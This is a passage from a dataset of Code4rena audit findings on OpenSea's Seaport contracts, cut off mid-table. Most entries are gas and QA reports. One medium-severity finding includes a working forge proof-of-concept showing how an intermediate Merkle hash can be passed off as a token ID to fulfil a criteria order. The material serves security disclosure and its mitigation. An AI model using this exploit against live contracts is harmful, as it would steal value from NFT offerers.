fulfillBasicOrder():\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L69-L74\n\n```solidity\n        // Update order status as fully filled, packing struct values.\n        _orderStatus[orderHash].isValidated = true;\n        _orderStatus[orderHash].isCancelled = false;\n        _orderStatus[orderHash].numerator = 1;\n        _orderStatus[orderHash].denominator = 1;\n    }\n```\n\n## Recommended Mitigation Steps\n\nConsider introducing userSalt to be used as an additional source of randomness, say to be purposely filled at random at UI level (say based on the interface interactions and so on) so even several similar orders placed into the same block will have different userSalt. I.e. salt being system-level seed, userSalt being user-level one based on user's actions.\n\n\n\n### 3. _orderStatus is never cleaned up\n\n_orderStatus will grow over time with system usage:\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L26-L28\n\n```solidity\ncontract OrderValidator is Executor, ZoneInteraction {\n    // Track status of each order (validated, cancelled, and fraction filled).\n    mapping(bytes32 => OrderStatus) private _orderStatus;\n```\n\n## Recommended Mitigation Steps\n\nConsider introducing a function to clean up any expired entry (i.e. with endTime low enough) so the size of the mapping can be controlled\n\n\n### 4. Comment diverging from the logic (low)\n\nThe _aggregateAvailable() concluding piece of logic sets the recipient to the offerer if no amount left so it be filtered out. Comment says otherwise:\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/FulfillmentApplier.sol#L180-L183\n\n```solidity\n            // Set the offerer as the receipient if execution amount is nonzero.\n            if (execution.item.amount == 0) {\n                execution.item.recipient = payable(execution.offerer);\n            }\n```\n\n## Recommended Mitigation Steps\n\n```solidity\n-\t\t\t// Set the offerer as the receipient if execution amount is nonzero.\n+\t\t\t// Set the offerer as the receipient if execution amount is zero.\n            if (execution.item.amount == 0) {\n                execution.item.recipient = payable(execution.offerer);\n            }\n```\n\n### 5. Leftover comment from another _transfer function (low)\n\nConduit's _transfer doesn't deal with native tokens, but have a possibly leftover comment from Executor's _transfer:\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/conduit/Conduit.sol#L174-L176\n\n```solidity\n    function _transfer(ConduitTransfer calldata item) internal {\n        // If the item type indicates Ether or a native token...\n        if (item.itemType == ConduitItemType.ERC20) {\n```\n\n## Recommended Mitigation Steps\n\nConsider either removing the comment or expanding it detailing the absence of the native token case in Conduit._transfer.\n\n\n### 6. Comment is misleading (low/non-critical)\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/conduit/lib/ConduitEnums.sol#L4-L5\n\n```solidity\nenum ConduitItemType {\n    NATIVE, // unused\n```\n\nItemType.NATIVE is used across the system:\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/BasicOrderFulfiller.sol#L173\n\n```solidity\nif (additionalRecipientsItemType == ItemType.NATIVE) {\n```\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/Executor.sol#L61\n\n```solidity\nif (item.itemType == ItemType.NATIVE) {\n```\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderCombiner.sol#L627\n\n```solidity\nif (item.itemType == ItemType.NATIVE) {\n```\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderFulfiller.sol#L245\n\n```solidity\nif (offerItem.itemType == ItemType.NATIVE) {\n```\n\n## Recommended Mitigation Steps\n\nConsider expanding to explain more narrow use of NATIVE vs other item types.\n\n\n### 7. Floating pragma is used in several contracts across the system (non-critical)\n\nAs different compiler versions have substantial specifics if the contracts get accidentally deployed using another compiler version compared to the one they were tested with, various types of undesired behavior can be introduced.\n\n## Proof of Concept\n\nUnlike most system's contracts, those do not have compiler version fixed:\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/conduit/Conduit.sol#L2\n\n```solidity\npragma solidity >=0.8.7;\n```\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/TokenTransferrer.sol#L2\n\n```solidity\npragma solidity >=0.8.7;\n```\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/TokenTransferrerConstants.sol#L2\n\n```solidity\npragma solidity >=0.8.7;\n```\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/ConsiderationConstants.sol#L2\n\n```solidity\npragma solidity >=0.8.7;\n```\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/ConsiderationEnums.sol#L2\n\n```solidity\npragma solidity >=0.8.7;\n```\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/ConsiderationStructs.sol#L2\n\n```solidity\npragma solidity >=0.8.7;\n```\n\n## Recommended Mitigation Steps\n\nConsider fixing the version to 0.8.13 for the whole set of system contracts.\n\n\n### 8. ReferenceExecutor uses hard coded itemTypes (non-critical)\n\nUsing hard coded values can lead to operational mistakes on further expansion of the system as it is reasonably hard to keep track of the correspondences.\n\n## Proof of Concept\n\nReferenceExecutor uses hard coded values for item types:\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/reference/lib/ReferenceExecutor.sol#L165\n\n```solidity\nuint256(1),\n```\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/reference/lib/ReferenceExecutor.sol#L218\n\n```solidity\nuint256(2),\n```\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/reference/lib/ReferenceExecutor.sol#L269\n\n```solidity\nuint256(3),\n```\n\n## Recommended Mitigation Steps\n\nConsider using the easily readable itemType constants from contracts/lib/ConsiderationEnums.sol\n",
    "dataSource": {
      "name": "code-423n4/2022-05-opensea-seaport-findings",
      "repo": "https://github.com/code-423n4/2022-05-opensea-seaport-findings",
      "url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/213"
    }
  },
  {
    "title": "QA Report",
    "body": "# LOW\n\n### vulnerable solidity compiler version\n\nSeaport uses 0.8.13 while there are known bugs discovered in that version [affecting arrays of dynamic types & Data Location](https://blog.soliditylang.org/2022/05/18/solidity-0.8.14-release-announcement/), so compiler version should be updated to atleast 0.8.14 on both reference and optimized.\n\n### Implementation does not match comment\n\nLocation: https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/Executor.sol#L541-L544\n\nComment is wrong stating \"Ensure result was extracted and matches EIP-1271 magic value.\" while it should match value `ConduitInterface.execute.selector`\n\n# NON-CRITICAL\n\n- `_performERC20Transfer` does zero code size check after executing the call, while `_performERC721Transfer` and `_performERC1155Transfer` does at vert begining of execution, so it should be normalized depending upon business logic.\n\n\n# GAS OPTIMIZATIONS\n\n- https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L86 , instead of `div` bit shift `>> 2` can be used to reduce runtime gas by 1 unit\n- Make constructors payable to reduce addition checks and hence removing some opcodes",
    "dataSource": {
      "name": "code-423n4/2022-05-opensea-seaport-findings",
      "repo": "https://github.com/code-423n4/2022-05-opensea-seaport-findings",
      "url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/202"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report for OpenSea by Perito Flores\n\n\n\n## [L-01] INSECURE ERC721 TRANSFERFROM\n\n\n### Impact\n\nTokens can be locked forever in the receiving contract\n\n### PoC\n\nThe function` _performERC721Transfer()` (reference and optimized) is only checking that the token is a contract.   This check seems weak to me and the most important would be to check if the receiving contract  is able to handle NFT (implements ` ERC721TokenReceiver` interface as recommended in the standard).  If not, the sender is responsible for this check.   If this is the case you should warn users in the doc.\nI added this report in my QA but this could be medium ( https://github.com/code-423n4/2021-06-pooltogether-findings/issues/115).   \n\n    function _performERC721Transfer(\n        address token,\n        address from,\n        address to,\n        uint256 identifier\n        ) internal {\n        if (token.code.length == 0) {\n           revert NoContract(token);\n       }\n    ERC721Interface(token).transferFrom(from, to, identifier);  @audit \n\n  }\n\n  ###  Recommended\n\n Check if the receiving contract is able to handle NFTS. \n\n\n\n\n## [L-02] _performERC20Transfer can incorrectly succeed in rare edge cases\n\nI could have put this issue in the gas report.    However I believe that exist a very unlikely edge case where this can fail.\nFirst of all there is a tautology here (`ReferenceTokenTransferrerer#L50`).\nthe first check (`data.length!=0` is redundant) so you could remove\n\n    if (data.length != 0 && data.length >= 32) { \n            if (!abi.decode(data, (bool))) {\n                revert BadReturnValueFromERC20OnTransfer(\n                    token,\n                    from,\n                    to,\n                    amount\n                );\n            }\n        }\n\nHowever, I believe that you should remove the second statement (`data.length >= 32`).     The edge case would be if the returned value is 16 bytes (or 8) then the transaction will always pass.     I believe that you should avoid it  because by doing you will save gas.\n There is a interesting post here that could help \n https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2577\n\n\n### Recommended\n\nRemove `data.length >= 32` to save gas and avoid edge cases.    This will be similar to OZ SafeTransfer.",
    "dataSource": {
      "name": "code-423n4/2022-05-opensea-seaport-findings",
      "repo": "https://github.com/code-423n4/2022-05-opensea-seaport-findings",
      "url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/189"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas: Unnecessary ERC20 transfer data length check\nThe [`data.length != 0 && data.length >= 32`](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/reference/lib/ReferenceTokenTransferrer.sol#L50) check has a redundancy. As `data.length >= 32` is required and `data.length >= 32` implies `data.length != 0`, one can simplify this expression to `data.length >= 32`.\nThe YUL version of the code checks \"`(abi.decode(data, uint256) == 1 && data.length > 31) || data.length == 0`\" which is correctly optimized.\n\n# Gas: Unnecessary conduit runtime code hash computation\nThe [`ConduitController`](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/conduit/ConduitController.sol#L37-L40) computes the `_CONDUIT_RUNTIME_CODE_HASH` variable by deploying a `Conduit` contract and reading its `.codehash`. However, this variable is only used to check if a contract has been deployed by checking `conduit.codehash == _CONDUIT_RUNTIME_CODE_HASH`. The `conduit` variable is always a `create2` address and by the way `create2` addresses work, the check can also be implemented as `condit.code.length != 0`. (Because the creation code is already part of the `create2` address and the creation code always leads to the same runtime code for `Conduit`s.)\nThis saves deploying a `Conduit` contract in the constructor and the new check should also be more gas-efficient.\n\n# Gas: Improve `MerkleProof.verify`\n\nThe `MerkleProof.verify` function can be improved using the `xor` trick instead of a `switch` to order the hashes. Plus some other improvements. [Credit](https://github.com/Rari-Capital/solmate/pull/243/files#diff-e4d991edd147030ef719c7598402ad2ea6b791c4132e81b9db59ae64fe351106L33)\n\n```diff\nfunction _verifyProof(\n    uint256 leaf,\n    uint256 root,\n    bytes32[] memory proof\n) internal pure {\n    bool isValid;\n\n    assembly {\n        // Start the hash off as just the starting leaf.\n        let computedHash := leaf\n\n        // Get memory start location of the first element in proof array.\n        let data := add(proof, OneWord)\n\n        // Iterate over proof elements to compute root hash.\n-        for {\n-            let end := add(data, mul(mload(proof), OneWord))\n-        } lt(data, end) {\n-            data := add(data, OneWord)\n-        } {\n-            // Get the proof element.\n-            let loadedData := mload(data)\n-\n-            // Sort and store proof element and hash.\n-            switch gt(computedHash, loadedData)\n-            case 0 {\n-                mstore(0, computedHash) // Place existing hash first.\n-                mstore(0x20, loadedData) // Place new hash next.\n-            }\n-            default {\n-                mstore(0, loadedData) // Place new hash first.\n-                mstore(0x20, computedHash) // Place existing hash next.\n-            }\n-\n-            // Derive the updated hash.\n-            computedHash := keccak256(0, TwoWords)\n-        }\n+        for {\n+            // Left shift by 5 is equivalent to multiplying by 0x20.\n+            let end := add(data, shl(5, mload(proof)))\n+        } lt(data, end) {\n+            data := add(data, OneWord)\n+        } {\n+            let loadedData := mload(data)\n+            // Slot of `computedHash` in scratch space.\n+            // If the condition is true: 0x20, otherwise: 0x00.\n+            let scratch := shl(5, gt(computedHash, loadedData))\n+\n+            // Store elements to hash contiguously in scratch space.\n+            // Scratch space is 64 bytes (0x00 - 0x3f) and both elements are 32 bytes.\n+            mstore(scratch, computedHash)\n+            mstore(xor(scratch, 0x20), loadedData)\n+            computedHash := keccak256(0, TwoWords)\n+        }\n\n        // Compare the final hash to the supplied root.\n        isValid := eq(computedHash, root)\n    }\n\n    // Revert if computed hash does not equal supplied root.\n    if (!isValid) {\n        revert InvalidProof();\n    }\n}\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-05-opensea-seaport-findings",
      "repo": "https://github.com/code-423n4/2022-05-opensea-seaport-findings",
      "url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/174"
    }
  },
  {
    "title": "Merkle Tree criteria can be resolved by wrong tokenIDs",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L157\n\n\n# Vulnerability details\n\n## Impact\nThe protocol allows specifying several tokenIds to accept for a single offer.\nA merkle tree is created out of these tokenIds and the root is stored as the `identifierOrCriteria` for the item.\nThe fulfiller then submits the actual tokenId and a proof that this tokenId is part of the merkle tree.\n\nThere are no real verifications on the merkle proof that the supplied tokenId is indeed **a leaf of the merkle tree**.\nIt's possible to submit an intermediate hash of the merkle tree as the tokenId and trade this NFT instead of one of the requested ones.\n\nThis leads to losses for the offerer as they receive a tokenId that they did not specify in the criteria.\nUsually, this criteria functionality is used to specify tokenIds with certain traits that are highly valuable. The offerer receives a low-value token that does not have these traits.\n\n#### Example\nAlice wants to buy either NFT with tokenId 1 or tokenId 2.\nShe creates a merkle tree of it and the root is `hash(1||2) = 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0`.\nShe creates an offer for this criteria.\nAn attacker can now acquire the NFT with tokenId `0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0` (or, generally, any other intermediate hash value) and fulfill the trade.\n\n> One might argue that this attack is not feasible because the provided hash is random and tokenIds are generally a counter. However, this is not required in the standard.\n> \n> \"While some ERC-721 smart contracts may find it convenient to start with ID 0 and simply increment by one for each new NFT, callers SHALL NOT assume that ID numbers have any specific pattern to them, and MUST treat the ID as a 'black box'.\" [EIP721](https://eips.ethereum.org/EIPS/eip-721)\n>\n> Neither do the standard OpenZeppelin/Solmate implementations use a counter. They only provide internal `_mint(address to, uint256 id)` functions that allow specifying an arbitrary `id`. NFT contracts could let the user choose the token ID to mint, especially contracts that do not have any linked off-chain metadata like Uniswap LP positions.\n> Therefore, ERC721-compliant token contracts are vulnerable to this attack.\n\n#### POC\nHere's a `forge` test ([gist](https://gist.github.com/MrToph/ccf5ec112b481e70dbf275aa0a3a02d6)) that shows the issue for the situation mentioned in _Example_.\n\n```solidity\ncontract BugMerkleTree is BaseOrderTest {\n    struct Context {\n        ConsiderationInterface consideration;\n        bytes32 tokenCriteria;\n        uint256 paymentAmount;\n        address zone;\n        bytes32 zoneHash;\n        uint256 salt;\n    }\n\n    function hashHashes(bytes32 hash1, bytes32 hash2)\n        internal\n        returns (bytes32)\n    {\n        // see MerkleProof.verify\n        bytes memory encoding;\n        if (hash1 <= hash2) {\n            encoding = abi.encodePacked(hash1, hash2);\n        } else {\n            encoding = abi.encodePacked(hash2, hash1);\n        }\n        return keccak256(encoding);\n    }\n\n    function testMerkleTreeBug() public resetTokenBalancesBetweenRuns {\n        // Alice wants to buy NFT ID 1 or 2 for token1. compute merkle tree\n        bytes32 leafLeft = bytes32(uint256(1));\n        bytes32 leafRight = bytes32(uint256(2));\n        bytes32 merkleRoot = hashHashes(leafLeft, leafRight);\n        console.logBytes32(merkleRoot);\n\n        Context memory context = Context(\n            consideration,\n            merkleRoot, /* tokenCriteria */\n            1e18, /* paymentAmount */\n            address(0), /* zone */\n            bytes32(0), /* zoneHash */\n            uint256(0) /* salt */\n        );\n        bytes32 conduitKey = bytes32(0);\n\n        token1.mint(address(alice), context.paymentAmount);\n        // @audit assume there's a token where anyone can acquire IDs. smaller IDs are more valuable\n        // we acquire the merkle root ID\n        test721_1.mint(address(this), uint256(merkleRoot));\n\n        _configureERC20OfferItem(\n            // start, end\n            context.paymentAmount, context.paymentAmount\n        );\n        _configureConsiderationItem(\n            ItemType.ERC721_WITH_CRITERIA,\n            address(test721_1),\n            // @audit set merkle root for NFTs we want to accept\n            uint256(context.tokenCriteria), /* identifierOrCriteria */\n            1,\n            1,\n            alice\n        );\n\n        OrderParameters memory orderParameters = OrderParameters(\n            address(alice),\n            context.zone,\n            offerItems,\n            considerationItems,\n            OrderType.FULL_OPEN,\n            block.timestamp,\n            block.timestamp + 1000,\n            context.zoneHash,\n            context.salt,\n            conduitKey,\n            considerationItems.length\n        );\n\n        OrderComponents memory orderComponents = getOrderComponents(\n            orderParameters,\n            context.consideration.getNonce(alice)\n        );\n        bytes32 orderHash = context.consideration.getOrderHash(orderComponents);\n        bytes memory signature = signOrder(\n            context.consideration,\n            alicePk,\n            orderHash\n        );\n\n        delete offerItems;\n        delete considerationItems;\n\n        /*************** ATTACK STARTS HERE ***************/\n        AdvancedOrder memory advancedOrder = AdvancedOrder(\n            orderParameters,\n            1, /* numerator */\n            1, /* denominator */\n            signature,\n            \"\"\n        );\n\n        // resolve the merkle root token ID itself\n        CriteriaResolver[] memory cr = new CriteriaResolver[](1);\n        bytes32[] memory proof = new bytes32[](0);\n        cr[0] = CriteriaResolver(\n              0, // uint256 orderIndex;\n              Side.CONSIDERATION, // Side side;\n              0, // uint256 index; (item)\n              uint256(merkleRoot), // uint256 identifier;\n              proof // bytes32[] criteriaProof;\n        );\n\n        uint256 profit = token1.balanceOf(address(this));\n        context.consideration.fulfillAdvancedOrder{\n            value: context.paymentAmount\n        }(advancedOrder, cr, bytes32(0));\n        profit = token1.balanceOf(address(this)) - profit;\n\n        // @audit could fulfill order without owning NFT 1 or 2\n        assertEq(profit, context.paymentAmount);\n    }\n}\n```\n\n## Recommended Mitigation Steps\nUsually, this is fixed by using a type-byte that indicates if one is computing the hash for a _leaf_ or not.\nAn elegant fix here is to simply [use hashes of the tokenIds](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L250) as the leaves - instead of the tokenIds themselves. (Note that this is the natural way to compute merkle trees if the data size is not already the hash size.)\nThen compute the leaf hash in the contract from the provided tokenId:\n\n```diff\nfunction _verifyProof(\n    uint256 leaf,\n    uint256 root,\n    bytes32[] memory proof\n) internal pure {\n    bool isValid;\n\n-    assembly {\n-        let computedHash := leaf\n+  bytes32 computedHash = keccak256(abi.encodePacked(leaf))\n  ...\n```\n\nThere can't be a collision between a leaf hash and an intermediate hash anymore as the former is the result of hashing 32 bytes, while the latter are the results of hashing 64 bytes.\n\nNote that this requires off-chain changes to how the merkle tree is generated. (Leaves must be hashed first.)\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-opensea-seaport-findings",
      "repo": "https://github.com/code-423n4/2022-05-opensea-seaport-findings",
      "url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "\n## Gas\n### [G-01] Cache Array Length Outside of Loop.\n#### Impact\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack. Caching the array length in the stack saves around 3 gas per iteration.\n#### Proof of Concept\n```solidity\n  lib\\OrderCombiner.sol::247 => for (uint256 j = 0; j < offer.length; ++j) {\n  lib\\OrderCombiner.sol::291 => for (uint256 j = 0; j < consideration.length; ++j) {\n  lib\\OrderCombiner.sol::598 => for (uint256 j = 0; j < consideration.length; ++j) {\n  lib\\OrderCombiner.sol::621 => for (uint256 i = 0; i < executions.length; ) {\n  lib\\OrderFulfiller.sol::217 => for (uint256 i = 0; i < orderParameters.offer.length; ) {\n  lib\\OrderFulfiller.sol::306 => for (uint256 i = 0; i < orderParameters.consideration.length; ) {\n```\n#### Recommendation\nStore the array’s length in a variable before the for-loop.\n\n### [G-02] No need to initialize variables with default values\n#### Impact\nIf a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n#### Proof of Concept\n```solidity\n  conduit\\Conduit.sol::66 => for (uint256 i = 0; i < totalStandardTransfers; ) {\n  conduit\\Conduit.sol::130 => for (uint256 i = 0; i < totalStandardTransfers; ) {\n  lib\\AmountDeriver.sol::44 => uint256 extraCeiling = 0;\n  lib\\BasicOrderFulfiller.sol::948 => for (uint256 i = 0; i < totalAdditionalRecipients; ) {\n  lib\\BasicOrderFulfiller.sol::1040 => for (uint256 i = 0; i < totalAdditionalRecipients; ) {\n  lib\\CriteriaResolution.sol::56 => for (uint256 i = 0; i < totalCriteriaResolvers; ++i) {\n  lib\\CriteriaResolution.sol::166 => for (uint256 i = 0; i < totalAdvancedOrders; ++i) {\n  lib\\CriteriaResolution.sol::184 => for (uint256 j = 0; j < totalItems; ++j) {\n  lib\\CriteriaResolution.sol::199 => for (uint256 j = 0; j < totalItems; ++j) {\n  lib\\OrderCombiner.sol::181 => for (uint256 i = 0; i < totalOrders; ++i) {\n  lib\\OrderCombiner.sol::247 => for (uint256 j = 0; j < offer.length; ++j) {\n  lib\\OrderCombiner.sol::291 => for (uint256 j = 0; j < consideration.length; ++j) {\n  lib\\OrderCombiner.sol::373 => for (uint256 i = 0; i < totalOrders; ++i) {\n  lib\\OrderCombiner.sol::470 => uint256 totalFilteredExecutions = 0;\n  lib\\OrderCombiner.sol::473 => for (uint256 i = 0; i < totalOfferFulfillments; ++i) {\n  lib\\OrderCombiner.sol::498 => for (uint256 i = 0; i < totalConsiderationFulfillments; ++i) {\n  lib\\OrderCombiner.sol::577 => for (uint256 i = 0; i < totalOrders; ++i) {\n  lib\\OrderCombiner.sol::598 => for (uint256 j = 0; j < consideration.length; ++j) {\n  lib\\OrderCombiner.sol::621 => for (uint256 i = 0; i < executions.length; ) {\n  lib\\OrderCombiner.sol::751 => uint256 totalFilteredExecutions = 0;\n  lib\\OrderCombiner.sol::754 => for (uint256 i = 0; i < totalFulfillments; ++i) {\n  lib\\OrderFulfiller.sol::217 => for (uint256 i = 0; i < orderParameters.offer.length; ) {\n  lib\\OrderFulfiller.sol::306 => for (uint256 i = 0; i < orderParameters.consideration.length; ) {\n  lib\\OrderFulfiller.sol::471 => for (uint256 i = 0; i < totalOrders; ++i) {\n  lib\\OrderValidator.sol::272 => for (uint256 i = 0; i < totalOrders; ) {\n  lib\\OrderValidator.sol::350 => for (uint256 i = 0; i < totalOrders; ) {\n```\n#### Recommendation\nRemove explicit default initializations.\n\n#### Tools used\nmanual\n\n\n## Gas Diffchecker \n`yarn profile` https://www.diffchecker.com/8afIz8bO\n\n## Gas Before\n```solidity    \n·----------------------------------------------------------------|---------------------------|---------------|-----------------------------·\n|                      Solc version: 0.8.13                      ·  Optimizer enabled: true  ·  Runs: 15000  ·  Block limit: 30000000 gas  │\n·································································|···························|···············|······························\n|  Methods                                                                                                                                 │\n······························|··································|·············|·············|···············|···············|··············\n|  Contract                   ·  Method                          ·  Min        ·  Max        ·  Avg          ·  # calls      ·  usd (avg)  │\n······························|··································|·············|·············|···············|···············|··············\n|  Conduit                    ·  execute                         ·      78300  ·    2316049  ·       474674  ·            6  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Conduit                    ·  executeBatch1155                ·          -  ·          -  ·       100007  ·            1  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Conduit                    ·  executeWithBatch1155            ·     100500  ·     370881  ·       267219  ·            3  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  ConduitController          ·  acceptOwnership                 ·          -  ·          -  ·        33337  ·            1  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  ConduitController          ·  cancelOwnershipTransfer         ·          -  ·          -  ·        28115  ·            1  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  ConduitController          ·  createConduit                   ·     723522  ·     723666  ·       723653  ·           31  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  ConduitController          ·  transferOwnership               ·          -  ·          -  ·        50442  ·            2  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  ConduitController          ·  updateChannel                   ·      36079  ·     120728  ·       106630  ·           19  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  EIP1271Wallet              ·  approveNFT                      ·          -  ·          -  ·        49681  ·           10  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  EIP1271Wallet              ·  registerDigest                  ·          -  ·          -  ·        44157  ·            1  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  EIP1271Wallet              ·  revertWithMessage               ·          -  ·          -  ·        21683  ·            1  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  EIP1271Wallet              ·  setValid                        ·      21705  ·      43617  ·        32661  ·            2  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  ExcessReturnDataRecipient  ·  setRevertDataSize               ·          -  ·          -  ·        43441  ·            2  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Reenterer                  ·  prepare                         ·          -  ·          -  ·       763392  ·            2  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  cancel                          ·      44124  ·      61272  ·        56915  ·           16  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  fulfillAdvancedOrder            ·     104014  ·     209693  ·       162960  ·          112  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  fulfillAvailableAdvancedOrders  ·     173305  ·     229465  ·       205136  ·           16  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  fulfillAvailableOrders          ·     172879  ·     229282  ·       206787  ·           13  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  fulfillBasicOrder               ·      93563  ·    1624267  ·       665050  ·          160  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  fulfillOrder                    ·     102728  ·     213402  ·       174621  ·          105  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  incrementNonce                  ·          -  ·          -  ·        47051  ·            6  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  matchAdvancedOrders             ·     206604  ·     272820  ·       255463  ·           67  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  matchOrders                     ·     166719  ·     366937  ·       268321  ·          105  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  validate                        ·      58025  ·      69440  ·        67068  ·           21  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC1155                ·  mint                            ·      47333  ·      49989  ·        49333  ·          130  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC1155                ·  setApprovalForAll               ·      26136  ·      46036  ·        45809  ·          182  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC20                  ·  approve                         ·      28872  ·      46236  ·        45626  ·          190  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC20                  ·  blockTransfer                   ·      22006  ·      43918  ·        32962  ·            4  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC20                  ·  mint                            ·      33947  ·      68483  ·        57537  ·           88  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC20                  ·  setNoReturnData                 ·      21954  ·      43866  ·        32910  ·            2  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC721                 ·  mint                            ·      51544  ·      68656  ·        66050  ·          158  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC721                 ·  setApprovalForAll               ·      26199  ·      46111  ·        45366  ·          270  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Deployments                                                   ·                                           ·  % of limit   ·             │\n·································································|·············|·············|···············|···············|··············\n|  Consideration                                                 ·          -  ·          -  ·      5347596  ·       17.8 %  ·          -  │\n·································································|·············|·············|···············|···············|··············\n|  EIP1271Wallet                                                 ·     600395  ·     600407  ·       600406  ·          2 %  ·          -  │\n·································································|·············|·············|···············|···············|··············\n|  ExcessReturnDataRecipient                                     ·          -  ·          -  ·       511260  ·        1.7 %  ·          -  │\n·································································|·············|·············|···············|···············|··············\n|  Reenterer                                                     ·          -  ·          -  ·       534991  ·        1.8 %  ·          -  │\n·································································|·············|·············|···············|···············|··············\n|  TestERC1155                                                   ·          -  ·          -  ·      1012405  ·        3.4 %  ·          -  │\n·································································|·············|·············|···············|···············|··············\n|  TestERC20                                                     ·          -  ·          -  ·      1039822  ·        3.5 %  ·          -  │\n·································································|·············|·············|···············|···············|··············\n|  TestERC721                                                    ·          -  ·          -  ·      1094209  ·        3.6 %  ·          -  │\n·································································|·············|·············|···············|···············|··············\n|  TestZone                                     